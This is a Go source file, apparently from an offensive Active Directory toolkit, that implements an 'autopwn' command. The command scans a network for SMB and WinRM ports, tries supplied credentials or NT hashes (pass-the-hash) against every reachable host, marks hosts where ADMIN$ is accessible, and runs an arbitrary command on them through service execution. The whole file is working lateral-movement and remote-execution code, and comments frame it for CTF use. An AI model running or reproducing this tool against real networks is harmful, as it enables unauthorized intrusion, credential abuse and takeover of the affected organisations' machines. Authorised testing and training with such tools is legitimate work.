// cmd/adgo/commands/autopwn_cmd.go
//
// adgo autopwn — Chaîne d'attaque automatique en une commande
//
// Flow :
//   1. Scan réseau → hôtes avec port 445/5985 ouverts
//   2. Test des credentials fournis sur tous les hôtes
//   3. Sur chaque hôte authentifié : exécuter "whoami /all"
//   4. Marquer les admins (accès ADMIN$) + afficher résumé
//   5. Sauvegarder dans la session
//
// Utilisation typique en CTF :
//   adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB
//   adgo autopwn targets.txt -u admin --hash aad3b435... -d LAB --exec "whoami"
//
// Avec session persistante :
//   adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --session --log-file run.jsonl
//   # Plus tard, reprendre :
//   adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --resume run.state

package commands

import (
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"adgo/pkg/common"
	"adgo/pkg/scanner"
	"adgo/pkg/smb"
	"adgo/pkg/winrm"

	"github.com/hirochachacha/go-smb2"
	"github.com/spf13/cobra"
)

var AutoPwnCmd = &cobra.Command{
	Use:   "autopwn <target>",
	Short: "Automated scan → auth → exec on all reachable hosts",
	Long: `Automated attack chain: scan → authenticate → execute command on all hosts.

Steps:
  1. Parse target (IP, CIDR, range, file)
  2. Port scan (445 + 5985)
  3. Test credentials on all open hosts
  4. Execute command on all authenticated hosts
  5. Mark admin hosts (ADMIN$ accessible)

Examples:
  # Basic: test creds and run whoami on all hosts
  adgo autopwn 192.168.1.0/24 -u admin -p Password123 -d LAB

  # Pass-the-Hash
  adgo autopwn 192.168.1.0/24 -u admin --hash aad3b435... -d LAB

  # Custom command
  adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --exec "net localgroup administrators"

  # With persistent session + JSON log
  adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --session --log-file ./run.jsonl

  # Resume an interrupted scan
  adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --resume --state-file ./scan.state`,
	Args: cobra.ExactArgs(1),
	RunE: runAutoPwn,
}

var (
	autopwnExec        string
	autopwnWorkers     int
	autopwnTimeout     int
	autopwnSession     bool
	autopwnLogFile     string
	autopwnResume      bool
	autopwnStateFile   string
	autopwnSuccessOnly bool
)

func init() {
	AutoPwnCmd.Flags().StringVarP(&autopwnExec, "exec", "c", "whoami /all", "Command to execute on authenticated hosts")
	AutoPwnCmd.Flags().IntVar(&autopwnWorkers, "workers", 20, "Parallel workers")
	AutoPwnCmd.Flags().IntVar(&autopwnTimeout, "timeout", 3, "Connection timeout in seconds")
	AutoPwnCmd.Flags().BoolVar(&autopwnSession, "session", false, "Save results to persistent session (~/.adgo/session_*.json)")
	AutoPwnCmd.Flags().StringVar(&autopwnLogFile, "log-file", "", "Append all events to JSON log file (e.g. run.jsonl)")
	AutoPwnCmd.Flags().BoolVar(&autopwnResume, "resume", false, "Resume a previous scan (skip already-completed targets)")
	AutoPwnCmd.Flags().StringVar(&autopwnStateFile, "state-file", "./adgo_scan.state", "State file for --resume")
	AutoPwnCmd.Flags().BoolVar(&autopwnSuccessOnly, "success-only", false, "Only show successful authentications")
}

func runAutoPwn(cmd *cobra.Command, args []string) error {
	targetStr := args[0]

	user := common.Username
	pass := common.Password
	domain := common.Domain
	ntHashStr := common.NTLMHash

	if user == "" || domain == "" {
		return fmt.Errorf("-u USER and -d DOMAIN are required")
	}
	if pass == "" && ntHashStr == "" {
		return fmt.Errorf("-p PASS or --hash NTHASH required")
	}

	// Initialiser la session si demandée
	if autopwnSession {
		_, err := common.InitSession(domain, "")
		if err != nil {
			common.PrintWarning(fmt.Sprintf("Session init failed: %v", err))
		}
	}

	// Initialiser le log JSON si demandé
	if autopwnLogFile != "" {
		if err := common.InitLogFile(autopwnLogFile); err != nil {
			return fmt.Errorf("log file error: %v", err)
		}
		common.PrintInfo(fmt.Sprintf("Logging to: %s", autopwnLogFile))
	}

	common.CurrentCommand = "autopwn"

	// Décoder le hash
	var hashBytes []byte
	if ntHashStr != "" {
		var err error
		hashBytes, err = hex.DecodeString(ntHashStr)
		if err != nil {
			return fmt.Errorf("invalid NT hash: %v", err)
		}
	}

	// Parser les cibles
	targets, err := scanner.ParseTargets(targetStr)
	if err != nil {
		return fmt.Errorf("invalid target: %v", err)
	}

	// Appliquer --resume si demandé
	if autopwnResume {
		allIPs := make([]string, len(targets))
		for i, t := range targets {
			allIPs[i] = t.IP
		}
		state := common.InitScanState("autopwn", allIPs, autopwnStateFile)
		pending := common.GetPendingTargets(allIPs)
		if len(pending) < len(allIPs) {
			common.PrintInfo(fmt.Sprintf("Resuming: %d/%d targets remaining",
				len(pending), len(allIPs)))
		}
		// Filtrer les targets
		pendingSet := make(map[string]bool)
		for _, p := range pending {
			pendingSet[p] = true
		}
		var filtered []scanner.Target
		for _, t := range targets {
			if pendingSet[t.IP] {
				filtered = append(filtered, t)
			}
		}
		targets = filtered
		_ = state
	}

	common.PrintInfo(fmt.Sprintf("AutoPwn: %d target(s) | %s\\%s | command: %q",
		len(targets), strings.ToUpper(domain), user, autopwnExec))

	common.LogInfo("", fmt.Sprintf("AutoPwn started: %d targets", len(targets)), map[string]interface{}{
		"domain": domain, "user": user, "target": targetStr,
	})

	// Stats
	var mu sync.Mutex
	var openCount, authCount, adminCount int

	cfg := &scanner.ScanConfig{
		Workers: autopwnWorkers,
		Timeout: time.Duration(autopwnTimeout) * time.Second,
		Ports:   []int{445, 5985},
	}

	scanner.RunWorkerPool(targets, cfg, func(t scanner.Target) scanner.ScanResult {
		result := autopwnTarget(t, user, pass, domain, hashBytes)

		mu.Lock()
		if result.Open {
			openCount++
		}
		if result.Authed {
			authCount++
		}
		if result.IsAdmin {
			adminCount++
		}
		mu.Unlock()

		// Marquer comme complété pour --resume
		if autopwnResume {
			common.MarkCompleted(t.IP)
		}

		return scanner.ScanResult{Target: t, Open: result.Open}
	})

	// Résumé final
	fmt.Println()
	common.NxSummaryHeader("AutoPwn complete")
	common.NxSummaryLine("Targets scanned", len(targets))
	common.NxSummaryLine("Hosts reachable", openCount)
	common.NxSummaryLine("Authenticated", authCount)
	common.NxSummaryLine("Admin access", adminCount)

	if autopwnSession {
		common.PrintSessionSummary()
	}

	return nil
}

// autopwnResult résultat pour un hôte
type autopwnResult struct {
	Open    bool
	Authed  bool
	IsAdmin bool
}

func autopwnTarget(t scanner.Target, user, pass, domain string, hashBytes []byte) autopwnResult {
	result := autopwnResult{}
	timeout := time.Duration(autopwnTimeout) * time.Second

	// Détecter le protocole disponible
	hasSMB := portOpenFast(t.IP, 445, timeout)
	hasWinRM := portOpenFast(t.IP, 5985, timeout)

	if !hasSMB && !hasWinRM {
		return result
	}
	result.Open = true

	line := common.NxLine{Protocol: "SMB", Host: t.IP, Port: 445, Hostname: t.Host}
	if hasWinRM && !hasSMB {
		line.Protocol = "WINRM"
		line.Port = 5985
	}

	// Tenter l'authentification
	if hasSMB {
		authed, isAdmin := trySMBAuthQuick(t.IP, user, domain, pass, hashBytes, timeout)
		if authed {
			result.Authed = true
			result.IsAdmin = isAdmin
			cred := common.NxCredString(domain, user, pass, ntHashStr(hashBytes))

			if isAdmin {
				common.NxPwned(line, cred)
				// Sauvegarder dans la session
				common.SaveCred(domain, user, pass, ntHashStr(hashBytes), "autopwn", true)
				common.SaveHost(t.IP, t.Host, "", []int{445}, true)
				common.LogSuccess(t.IP, fmt.Sprintf("Admin access: %s\\%s", domain, user), map[string]interface{}{
					"user": user, "domain": domain, "is_admin": true,
				})

				// Exécuter la commande
				if autopwnExec != "" {
					execOutput(t.IP, user, pass, domain, hashBytes, line)
				}
			} else {
				common.NxSuccess(line, cred)
				common.SaveCred(domain, user, pass, ntHashStr(hashBytes), "autopwn", false)
				common.SaveHost(t.IP, t.Host, "", []int{445}, false)
			}
			return result
		}
		if !autopwnSuccessOnly {
			common.NxFailure(line, fmt.Sprintf("%s\\%s - access denied", strings.ToUpper(domain), user))
		}
	} else if hasWinRM {
		// Tenter WinRM
		out, err := winrm.RunCommand(t.IP, user, pass, "whoami")
		if err == nil {
			result.Authed = true
			line.Protocol = "WINRM"
			line.Port = 5985
			common.NxSuccess(line, common.NxCredString(domain, user, pass, ntHashStr(hashBytes)))
			if autopwnExec != "" && autopwnExec != "whoami /all" {
				common.NxExecOutput(line, out)
			}
			common.SaveCred(domain, user, pass, ntHashStr(hashBytes), "autopwn-winrm", false)
		} else if !autopwnSuccessOnly {
			common.NxFailure(line, fmt.Sprintf("WinRM: %s\\%s - access denied", strings.ToUpper(domain), user))
		}
	}

	return result
}

func execOutput(ip, user, pass, domain string, hashBytes []byte, line common.NxLine) {
	execCfg := smb.DefaultExecConfig()
	execCfg.Timeout = 15 * time.Second
	result, err := smb.SvcExec(ip, user, domain, pass, hashBytes, autopwnExec, execCfg)
	if err == nil && result.Output != "" {
		common.NxExecOutput(line, result.Output)
		common.LogSuccess(ip, "Command output", map[string]interface{}{
			"command": autopwnExec, "output": result.Output,
		})
	}
}

func trySMBAuthQuick(ip, user, domain, pass string, hashBytes []byte, timeout time.Duration) (authed, isAdmin bool) {
	conn, err := net.DialTimeout("tcp", ip+":445", timeout)
	if err != nil {
		return false, false
	}
	defer conn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User: user, Password: pass, Domain: domain, Hash: hashBytes,
		},
	}
	session, err := d.Dial(conn)
	if err != nil {
		return false, false
	}
	defer session.Logoff()

	fs, err := session.Mount("ADMIN$")
	if err == nil {
		fs.Umount()
		return true, true
	}
	return true, false
}

func portOpenFast(host string, port int, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func ntHashStr(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	return hex.EncodeToString(b)
}
